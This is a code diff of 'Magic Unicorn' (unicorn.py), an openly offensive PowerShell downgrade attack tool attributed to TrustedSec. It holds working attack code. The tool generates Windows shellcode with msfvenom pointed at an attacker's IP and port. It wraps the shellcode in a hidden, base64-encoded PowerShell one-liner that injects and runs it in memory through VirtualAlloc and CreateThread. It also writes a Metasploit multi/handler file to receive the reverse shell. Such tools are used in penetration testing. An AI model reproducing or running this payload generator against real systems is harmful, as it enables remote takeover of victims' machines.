@@ -2,7 +2,7 @@
 #
 # Magic Unicorn - PowerShell downgrade attack tool
 #
-# Written by: Dave Kennedy (@dave_rel1k)
+# Written by: Dave Kennedy (@HackingDave)
 # Company: TrustedSec (@TrustedSec) https://www.trustedsec.com
 #
 # Real quick down and dirty for native x86 powershell on any platform
@@ -25,7 +25,7 @@ def generate_shellcode(payload,ipaddr,port):
     proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
-    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'buf=' : ''}
+    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'buf=' : '', 'Found 0 compatible encoders' : '', 'unsignedcharbuf[]=' : ''}
     data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
     return data
 
@@ -52,8 +52,9 @@ def format_payload(payload, ipaddr, port):
     shellcode = newdata[:-1]
     
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}""" % (shellcode))
-    full_attack = "powershell -nop -wind hidden -noni -enc " + base64.b64encode(powershell_code.encode('utf_16_le'))  
+    powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}""" %  (shellcode))
+
+    full_attack = "powershell -nop -win hid -noni -enc " + base64.b64encode(powershell_code.encode('utf_16_le'))  
 
     # write out powershell attacks
     filewrite = file("powershell_attack.txt", "w")
@@ -62,7 +63,7 @@ def format_payload(payload, ipaddr, port):
 
     # write out rc file
     filewrite = file("unicorn.rc", "w")
-    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n" % (payload,ipaddr,port))
+    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (payload,ipaddr,port))
     filewrite.close()
 
     print "[*] Exported powershell output code to powershell_attack.txt."
@@ -119,8 +120,10 @@ except IndexError:
                          ( __;        ( _;            ('-_';
                          |___\        \___:            \___:
 """
+    print "--------------------Magic Unicorn Attack Vector\n\n-----------------------------"
     print "Real quick down and dirty for native x86 powershell on any platform"
-    print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com"
+    print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)"
+    print "Twitter: @TrustedSec, @HackingDave"
     print "Happy Magic Unicorns."
     print "\n"
     print "Usage: python unicorn.py payload reverse_ipaddr port"
